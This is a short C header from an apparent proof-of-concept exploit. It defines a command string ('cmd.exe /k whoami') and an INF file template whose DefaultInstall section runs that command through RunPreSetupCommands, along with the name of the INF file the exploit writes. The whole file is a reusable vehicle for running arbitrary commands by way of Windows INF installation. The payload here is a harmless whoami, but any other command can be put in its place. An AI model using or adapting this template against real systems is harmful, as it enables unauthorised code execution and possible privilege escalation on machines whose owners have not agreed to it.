#pragma once

#define POC_COMMAND "cmd.exe /k whoami"
#define POC_INF ( "[version]\r\nsignature = $Windows NT$\r\n\r\n[DefaultInstall]\r\nRunPreSetupCommands = poc\r\n\r\n[poc]\r\n" POC_COMMAND )
#define POC_INF_NAME L"poc_exec_cmd.inf"